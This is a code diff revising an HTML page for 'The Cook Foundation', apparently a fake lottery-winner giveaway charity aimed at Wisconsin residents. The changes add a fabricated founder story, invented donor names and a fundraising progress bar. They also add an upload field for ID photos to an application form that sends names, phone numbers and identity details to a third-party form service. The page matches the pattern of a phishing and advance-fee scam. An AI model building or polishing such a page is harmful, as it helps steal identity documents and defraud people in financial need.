@@ -7,29 +7,28 @@
   <script src="https://cdn.tailwindcss.com"></script>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
   <style>
-    body { font-family: system-ui, -apple-system, sans-serif; }
-    .hero { background: linear-gradient(rgba(0,0,0,0.65), rgba(0,0,0,0.65)), url('https://picsum.photos/id/1015/2000/1200'); background-size: cover; background-position: center; }
-    .giveaway-img { height: 220px; object-fit: cover; border-radius: 16px; }
+    body { font-family: 'Inter', system-ui, sans-serif; }
+    .hero { background: linear-gradient(rgba(0,0,0,0.75), rgba(0,0,0,0.75)), url('https://picsum.photos/id/1015/2000/1200') center/cover no-repeat; }
   </style>
 </head>
-<body class="bg-gray-50">
+<body class="bg-zinc-50">
 
   <!-- Navigation -->
-  <nav class="bg-white shadow sticky top-0 z-50">
-    <div class="max-w-6xl mx-auto px-6 py-5 flex justify-between items-center">
-      <div class="flex items-center gap-3">
-        <i class="fa-solid fa-hand-holding-heart text-4xl text-emerald-600"></i>
+  <nav class="bg-white border-b sticky top-0 z-50">
+    <div class="max-w-7xl mx-auto px-8 py-6 flex justify-between items-center">
+      <div class="flex items-center gap-4">
+        <i class="fa-solid fa-hand-holding-heart text-4xl text-emerald-700"></i>
         <div>
-          <h1 class="text-2xl font-bold text-emerald-700">The Cook Foundation</h1>
-          <p class="text-xs text-gray-500 -mt-1">Wisconsin</p>
+          <h1 class="text-2xl font-semibold">The Cook Foundation</h1>
+          <p class="text-xs text-zinc-500">WISCONSIN • EST. 2022</p>
         </div>
       </div>
-      <div class="flex gap-8 text-lg">
-        <a href="#story" class="hover:text-emerald-600">Our Story</a>
-        <a href="#programs" class="hover:text-emerald-600">Programs</a>
-        <a href="#apply" class="hover:text-emerald-600">Apply</a>
-        <a href="#testimonials" class="hover:text-emerald-600">Stories</a>
-        <a href="#contact" class="hover:text-emerald-600">Contact Us</a>
+      <div class="flex gap-10 text-lg font-medium">
+        <a href="#story" class="hover:text-emerald-700">Our Story</a>
+        <a href="#programs" class="hover:text-emerald-700">Programs</a>
+        <a href="#impact" class="hover:text-emerald-700">Our Impact</a>
+        <a href="#apply" class="hover:text-emerald-700">Apply</a>
+        <a href="#contact" class="hover:text-emerald-700">Contact</a>
       </div>
     </div>
   </nav>
@@ -37,125 +36,115 @@
   <!-- Hero -->
   <section class="hero text-white py-40 text-center">
     <div class="max-w-4xl mx-auto px-6">
-      <h2 class="text-5xl md:text-6xl font-bold mb-6">The Cook Foundation</h2>
-      <p class="text-2xl mb-10">Turning blessings into community impact across Wisconsin.</p>
+      <h2 class="text-5xl md:text-6xl font-semibold mb-6">From One Blessing To Many</h2>
+      <p class="text-2xl">Supporting Wisconsin families through generosity and care.</p>
     </div>
   </section>
 
-  <!-- Thomas Cook Story -->
-  <section id="story" class="py-20 bg-white">
-    <div class="max-w-4xl mx-auto px-6 text-center">
-      <h2 class="text-4xl font-bold mb-8">Our Founder’s Story</h2>
-      <div class="bg-emerald-50 p-10 rounded-3xl">
-        <p class="text-2xl italic">"After winning the lottery, I realized my purpose was bigger than personal wealth. I founded The Cook Foundation to give back and support hardworking families, students, and businesses across Wisconsin."</p>
-        <p class="mt-8 font-bold text-xl">— Thomas Cook, Lottery Winner & Founder</p>
+  <!-- Founder Story -->
+  <section id="story" class="py-24 bg-white">
+    <div class="max-w-6xl mx-auto px-6 grid md:grid-cols-2 gap-16 items-center">
+      <div>
+        <img src="https://i.imgur.com/ZD2xB.jpg" alt="Thomas Cook" class="rounded-3xl shadow-2xl">
+      </div>
+      <div>
+        <h2 class="text-4xl font-semibold mb-8">Our Founder’s Story</h2>
+        <p class="text-lg leading-relaxed text-zinc-600">
+          On June 10, 2020, Thomas Cook won $22 million from the Wisconsin Lottery. Instead of keeping the fortune for himself, 
+          he chose to create something lasting. Together with his family, he founded The Cook Foundation — a promise to give back 
+          to the communities that raised him.
+        </p>
+        <p class="text-lg leading-relaxed text-zinc-600 mt-6">
+          What began as one man's life-changing moment has grown into a beacon of hope for students needing school supplies, 
+          families struggling to make ends meet, small businesses fighting to survive, and individuals facing hardship. 
+          Every giveaway, every act of kindness, carries the spirit of gratitude and compassion.
+        </p>
+        <p class="mt-10 font-semibold text-xl">— Thomas Cook, Founder</p>
       </div>
     </div>
   </section>
 
-  <!-- Programs -->
-  <section id="programs" class="py-20 bg-gray-100">
+  <!-- Impact / Donation Tracking -->
+  <section id="impact" class="py-24 bg-zinc-100">
     <div class="max-w-6xl mx-auto px-6">
-      <h2 class="text-4xl font-bold text-center mb-12">Our Giveaway Programs</h2>
-      <div class="grid md:grid-cols-2 gap-10">
-        <div class="flex gap-6 items-center">
-          <img src="https://picsum.photos/id/201/600/400" class="giveaway-img w-1/2" alt="School supplies">
-          <div><h3 class="font-bold text-2xl">Students</h3><p>Backpacks, laptops & school supplies</p></div>
+      <h2 class="text-4xl font-semibold text-center mb-12">Our Impact This Year</h2>
+      
+      <!-- Progress Bar -->
+      <div class="bg-white p-10 rounded-3xl shadow mb-16">
+        <div class="flex justify-between mb-3">
+          <span class="font-semibold">$248,750 Raised</span>
+          <span class="font-semibold text-emerald-700">$500,000 Goal</span>
         </div>
-        <div class="flex gap-6 items-center">
-          <img src="https://picsum.photos/id/251/600/400" class="giveaway-img w-1/2" alt="Household">
-          <div><h3 class="font-bold text-2xl">Households</h3><p>Food, clothing & home essentials</p></div>
+        <div class="h-4 bg-zinc-200 rounded-full overflow-hidden">
+          <div class="h-4 bg-emerald-600 rounded-full w-[50%]"></div>
         </div>
-        <div class="flex gap-6 items-center">
-          <img src="https://picsum.photos/id/180/600/400" class="giveaway-img w-1/2" alt="Business">
-          <div><h3 class="font-bold text-2xl">Businesses</h3><p>Equipment & startup resources</p></div>
-        </div>
-        <div class="flex gap-6 items-center">
-          <img src="https://picsum.photos/id/64/600/400" class="giveaway-img w-1/2" alt="Individuals">
-          <div><h3 class="font-bold text-2xl">Individuals</h3><p>Emergency & personal support</p></div>
-        </div>
+        <p class="text-center text-sm text-zinc-500 mt-4">50% toward our 2026 community goal</p>
+      </div>
+
+      <!-- Recent Donations -->
+      <h3 class="text-2xl font-semibold mb-8 text-center">Recent Supporters</h3>
+      <div class="grid md:grid-cols-3 gap-6">
+        <div class="bg-white p-6 rounded-2xl">$5,000 — Anonymous Donor, Madison</div>
+        <div class="bg-white p-6 rounded-2xl">$2,500 — Johnson Family, Milwaukee</div>
+        <div class="bg-white p-6 rounded-2xl">$1,000 — Sarah & Mike Thompson, Green Bay</div>
+        <div class="bg-white p-6 rounded-2xl">$750 — Dr. Elena Rodriguez</div>
+        <div class="bg-white p-6 rounded-2xl">$3,000 — Community Church of Appleton</div>
+        <div class="bg-white p-6 rounded-2xl">$500 — Robert & Lisa Chen</div>
       </div>
     </div>
   </section>
 
   <!-- Application Form -->
-  <section id="apply" class="py-20 bg-white">
+  <section id="apply" class="py-24 bg-white">
     <div class="max-w-2xl mx-auto px-6">
-      <h2 class="text-4xl font-bold text-center mb-10">Apply for Support</h2>
-      <form action="https://formspree.io/f/mbdvovzv" method="POST" class="bg-gray-50 p-10 rounded-3xl shadow-xl">
+      <h2 class="text-4xl font-semibold text-center mb-12">Apply for Support</h2>
+      <form action="https://formspree.io/f/mbdvovzv" method="POST" enctype="multipart/form-data" class="bg-zinc-50 p-12 rounded-3xl shadow">
         <div class="grid md:grid-cols-2 gap-6">
-          <div><label class="block mb-2 font-medium">Full Name</label><input type="text" name="name" required class="w-full px-4 py-3 border rounded-xl"></div>
-          <div><label class="block mb-2 font-medium">Age</label><input type="number" name="age" required class="w-full px-4 py-3 border rounded-xl"></div>
+          <div><label class="block mb-2 font-medium">Full Name</label><input type="text" name="name" required class="w-full px-5 py-4 border border-zinc-200 rounded-2xl"></div>
+          <div><label class="block mb-2 font-medium">Age</label><input type="number" name="age" required class="w-full px-5 py-4 border border-zinc-200 rounded-2xl"></div>
         </div>
         <div class="mt-6"><label class="block mb-2 font-medium">Form of Identification</label>
-          <select name="id_type" required class="w-full px-4 py-3 border rounded-xl">
-            <option value="">Choose...</option>
+          <select name="id_type" required class="w-full px-5 py-4 border border-zinc-200 rounded-2xl">
+            <option value="">Select...</option>
             <option value="Drivers License">Driver's License</option>
             <option value="State ID">State ID</option>
             <option value="Passport">Passport</option>
           </select>
         </div>
-        <div class="mt-6"><label class="block mb-2 font-medium">Phone Number</label><input type="tel" name="phone" required class="w-full px-4 py-3 border rounded-xl"></div>
-        <div class="mt-8"><label class="block mb-3 font-medium">How would $50,000 help your household or business?</label>
-          <textarea name="story" rows="6" required class="w-full px-4 py-3 border rounded-2xl" placeholder="Tell us your story..."></textarea>
+        <div class="mt-6"><label class="block mb-2 font-medium">Phone Number</label><input type="tel" name="phone" required class="w-full px-5 py-4 border border-zinc-200 rounded-2xl"></div>
+        
+        <div class="mt-8">
+          <label class="block mb-3 font-medium">Upload Photo of Your ID (for verification)</label>
+          <input type="file" name="id_photo" accept="image/*,.pdf" class="w-full px-5 py-4 border border-zinc-200 rounded-2xl bg-white">
         </div>
-        <button type="submit" class="mt-10 w-full bg-emerald-600 hover:bg-emerald-700 text-white py-6 rounded-2xl text-xl font-bold">Submit Application</button>
+
+        <div class="mt-8">
+          <label class="block mb-3 font-medium">How would support help your household or business?</label>
+          <textarea name="story" rows="6" required class="w-full px-5 py-4 border border-zinc-200 rounded-3xl" placeholder="Share your story..."></textarea>
+        </div>
+
+        <button type="submit" class="mt-12 w-full bg-emerald-700 hover:bg-emerald-800 text-white py-7 rounded-3xl text-xl font-semibold">
+          Submit Application
+        </button>
       </form>
     </div>
   </section>
 
-  <!-- Testimonials -->
-  <section id="testimonials" class="py-20 bg-gray-100">
-    <div class="max-w-6xl mx-auto px-6">
-      <h2 class="text-4xl font-bold text-center mb-12">Community Testimonials</h2>
-      <div class="grid md:grid-cols-2 lg:grid-cols-3 gap-6 text-sm">
-        <!-- 20 testimonials remain the same as before -->
-        <div class="bg-white p-6 rounded-2xl shadow">"The support changed our lives." — Lisa P., Madison</div>
-        <div class="bg-white p-6 rounded-2xl shadow">"School supplies for my kids meant everything." — Jamal R., Milwaukee</div>
-        <div class="bg-white p-6 rounded-2xl shadow">"Helped my small business get back on its feet." — Carla M., Green Bay</div>
-        <div class="bg-white p-6 rounded-2xl shadow">"Truly caring organization." — Robert T., Eau Claire</div>
-        <div class="bg-white p-6 rounded-2xl shadow">"Food assistance during tough times." — Aisha K., Kenosha</div>
-        <div class="bg-white p-6 rounded-2xl shadow">"Best decision I made was applying." — Michael S., Appleton</div>
-        <div class="bg-white p-6 rounded-2xl shadow">"Gave my family hope again." — Sophia L., Racine</div>
-        <div class="bg-white p-6 rounded-2xl shadow">"Fast and respectful help." — David N., Waukesha</div>
-        <div class="bg-white p-6 rounded-2xl shadow">"Business equipment was a game changer." — Elena V., Oshkosh</div>
-        <div class="bg-white p-6 rounded-2xl shadow">"Thank you Thomas Cook!" — Marcus J., La Crosse</div>
-        <div class="bg-white p-6 rounded-2xl shadow">"They really listen to your needs." — Priya S., Madison</div>
-        <div class="bg-white p-6 rounded-2xl shadow">"Helped with rent and groceries." — Kevin B., Beloit</div>
-        <div class="bg-white p-6 rounded-2xl shadow">"Laptop for my online classes." — Hannah T., Stevens Point</div>
-        <div class="bg-white p-6 rounded-2xl shadow">"Community at its finest." — George W., Superior</div>
-        <div class="bg-white p-6 rounded-2xl shadow">"Gave clothes for my children." — Fatima A., Wausau</div>
-        <div class="bg-white p-6 rounded-2xl shadow">"Incredible impact on our family." — Daniel P., Manitowoc</div>
-        <div class="bg-white p-6 rounded-2xl shadow">"Professional and kind team." — Rachel M., Fond du Lac</div>
-        <div class="bg-white p-6 rounded-2xl shadow">"Changed my small business trajectory." — Omar K., Janesville</div>
-        <div class="bg-white p-6 rounded-2xl shadow">"Forever grateful." — Nicole D., Sheboygan</div>
-        <div class="bg-white p-6 rounded-2xl shadow">"True example of giving back." — Thomas H., Madison</div>
-      </div>
-    </div>
-  </section>
-
-  <!-- Contact Us -->
-  <section id="contact" class="py-20 bg-emerald-700 text-white text-center">
+  <!-- Contact -->
+  <section id="contact" class="py-24 bg-emerald-800 text-white text-center">
     <div class="max-w-2xl mx-auto px-6">
-      <h2 class="text-4xl font-bold mb-6">Contact Us</h2>
+      <h2 class="text-4xl font-semibold mb-10">Contact Us</h2>
       <p class="text-3xl mb-4">📧 THECOOKFOUNDATION@proton.me</p>
       <p class="text-3xl">📞 (343) 430-0052</p>
-      <p class="mt-10 text-2xl">Follow us on X: <a href="https://x.com/Thecook_j" target="_blank" class="underline">@Thecook_j</a></p>
+      <p class="mt-10 text-2xl">X: <a href="https://x.com/Thecook_j" target="_blank" class="underline">@Thecook_j</a></p>
     </div>
   </section>
 
   <!-- Footer -->
-  <footer class="bg-gray-900 text-gray-400 py-16 text-center">
-    <p class="text-3xl font-bold text-white mb-3">The Cook Foundation</p>
+  <footer class="bg-zinc-900 text-zinc-400 py-16 text-center">
+    <p class="text-3xl font-semibold text-white mb-3">The Cook Foundation</p>
     <p class="text-lg">Supporting Wisconsin Communities Since 2022</p>
-    <div class="mt-8 flex flex-col gap-3 text-lg">
-      <p>📧 <a href="mailto:THECOOKFOUNDATION@proton.me" class="hover:text-white">THECOOKFOUNDATION@proton.me</a></p>
-      <p>📞 (343) 430-0052</p>
-      <p class="mt-6">
-        <a href="https://x.com/Thecook_j" target="_blank" class="text-4xl hover:text-white"><i class="fa-brands fa-x-twitter"></i></a>
-      </p>
-    </div>
-    <p class="text-sm mt-12">© 2026 All Rights Reserved</p>
+    <p class="mt-12">© 2026 All Rights Reserved</p>
   </footer>
 
 </body>
